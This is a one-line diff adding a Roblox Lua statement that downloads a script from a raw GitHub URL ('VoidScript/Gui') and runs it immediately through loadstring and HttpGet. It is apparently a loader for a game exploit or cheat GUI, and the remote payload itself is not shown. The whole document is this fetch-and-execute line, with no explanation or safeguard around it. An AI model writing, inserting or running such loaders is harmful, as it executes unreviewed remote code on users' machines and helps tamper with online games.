@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/VoidScript/refs/heads/main/Gui'))()
